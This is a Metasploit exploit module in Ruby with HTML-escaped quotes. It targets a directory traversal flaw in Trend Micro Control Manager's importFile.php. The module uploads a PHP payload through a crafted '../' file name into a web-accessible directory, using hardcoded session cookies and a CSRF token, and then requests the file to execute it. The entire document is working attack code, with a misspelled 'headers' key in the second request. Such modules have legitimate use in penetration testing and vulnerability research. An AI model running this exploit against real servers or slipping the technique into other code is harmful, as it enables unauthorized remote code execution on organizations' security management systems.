require &#039;msf/core/exploit/php_exe&#039;
 
class MetasploitModule < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::FileDropper
    include Msf::Exploit::PhpEXE
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Trend Micro Control Manager importFile Directory Traversal RCE&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a directory traversal vulnerability found in Trend Micro
                Control Manager. The vulnerability is triggered when sending a specially crafted
                fileName (containing ../&#039;s) parameter to the importFile.php script. This will allow
                for writing outside of the ImportPolicy directory.
            },
            &#039;Author&#039;         => [ &#039;james fitts&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;ZDI&#039;, &#039;17-060&#039; ],
                    [ &#039;URL&#039;, &#039;https://success.trendmicro.com/solution/1116624&#039; ]
                ],
            &#039;Payload&#039;    =>
                {
                    &#039;BadChars&#039; => "\x00",
                },
            &#039;Platform&#039;       => &#039;php&#039;,
            &#039;Arch&#039;       => ARCH_PHP,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Generic (PHP Payload)&#039;, { &#039;Arch&#039; => ARCH_PHP, &#039;Platform&#039; => &#039;php&#039; } ],
                ],
            &#039;DefaultTarget&#039; => 0,
            &#039;DisclosureDate&#039; => &#039;Feb 07 2017&#039;))
 
        register_options(
            [
                OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to TMCM&#039;, &#039;/webapp&#039;]),
                OptBool.new(&#039;SSL&#039;, [ true, &#039;Use SSL&#039;, true]),
                Opt::RPORT(443),
            ], self.class)
    end
 
    def exploit
        require &#039;securerandom&#039;
 
        uri =    target_uri.path
        uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
 
        boundary = SecureRandom.hex
        payload_name = "#{rand_text_alpha(5)}.php"
        print_status("Uploading #{payload_name} to the server...")
 
        cookies =  "ASP_NET_SessionId=55hjl0burcvx21uslfxjbabs; "
        cookies << "wf_cookie_path=%2F; WFINFOR=#{rand_text_alpha(10)}; "
        cookies << "PHPSESSID=fc4o2lg5fpgognc28sjcitugj1; "
        cookies << "wf_CSRF_token=bd52b54ced23d3dc257984f68c39d34b; "
        cookies << "un=a8cad04472597b0c1163743109dad8f1; userID=1; "
        cookies << "LANG=en_US; "
        cookies << "wids=modTmcmCriticalEvents%2CmodTmcmUserThreatDetection%2CmodTmcmAppStatusSrv%2CmodTmcmTopThreats%2CmodTmcmEndpointThreatDetection%2CmodTmcmCompCompliance%2C; "
        cookies << "lastID=65; cname=mainConsole; theme=default; lastTab=-1"
 
        post_body = []
        post_body << "--#{boundary}\r\n"
        post_body << "Content-Disposition: form-data; name=\"action\"\r\n\r\n"
        post_body << "importPolicy\r\n"
        post_body << "--#{boundary}\r\n"
        post_body << "Content-Disposition: form-data; name=\"fileSize\"\r\n\r\n"
        post_body << "2097152\r\n"
        post_body << "--#{boundary}\r\n"
        post_body << "Content-Disposition: form-data; name=\"fileName\"\r\n\r\n"
        post_body << "../../../widget_60_2899/repository/db/sqlite/#{payload_name}\r\n"
        post_body << "--#{boundary}\r\n"
        post_body << "Content-Disposition: form-data; name=\"filename\";\r\n"
        post_body << "filename=\"policy.cmpolicy\"\r\n"
        post_body << "Content-Type: application/octet-stream\r\n\r\n"
        post_body << "<?php #{payload.raw} ?>\r\n\r\n"
        post_body << "--#{boundary}--\r\n"
 
        res = send_request_cgi({
            &#039;method&#039;    => &#039;POST&#039;,
            &#039;uri&#039;           =>   normalize_uri("#{uri}", "widget", "repository", "widgetPool", "wp1", "widgetBase", "modTMCM", "inc", "importFile.php"),
            &#039;ctype&#039;     =>   "multipart/form-data; boundary=#{boundary}",
            &#039;data&#039;      =>   post_body.join,
            &#039;headers&#039;   =>   {
                &#039;Cookie&#039;                    =>   cookies,
                &#039;Accept-Encoding&#039;   =>   "gzip;q=1.0,deflate;q=0.6,identity;q=0.3",
                &#039;Connection&#039;            =>   "close",
                &#039;Accept&#039;                    =>   "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                &#039;Accept-Language&#039;   =>   "en-US,en;q=0.5",
            },
        })
 
        if res.body =~ /Import Successfully/
            print_good("#{payload_name} uploaded successfully!")
            print_status("Attempting to execute payload...")
 
            res = send_request_cgi({
                &#039;method&#039;    =>   &#039;GET&#039;,
                &#039;uri&#039;           =>   normalize_uri("#{uri}", "widget_60_2899", "repository", "db", "sqlite", "#{payload_name}"),
                &#039;headesr&#039;   =>   {
                    &#039;Cookie&#039;    =>   cookies
                }
            })
 
        else
            print_error("Something went wrong...")
        end
 
    end
end

